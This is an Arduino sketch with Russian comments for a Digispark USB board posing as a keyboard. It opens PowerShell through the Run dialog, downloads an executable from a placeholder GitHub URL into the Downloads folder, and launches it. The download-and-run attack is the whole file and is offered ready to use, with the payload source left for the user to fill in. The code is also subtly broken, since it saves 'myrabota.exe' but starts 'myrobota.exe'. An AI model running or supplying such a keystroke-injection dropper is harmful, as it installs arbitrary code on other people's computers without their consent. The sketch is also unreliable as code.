#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(3000);

  // Win+R → PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // Скачивание файла в Downloads
  DigiKeyboard.print("Invoke-WebRequest \"https://raw.githubusercontent.com/(сюда вставляем свой репозиторий гитхаб с exe или другой источник).exe\" -OutFile \"$env:USERPROFILE\\Downloads\\myrabota.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // ждём пока точно докачается

  // Запуск скачанного файла через полный путь
  DigiKeyboard.print("Start-Process -FilePath \"$env:USERPROFILE\\Downloads\\myrobota.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
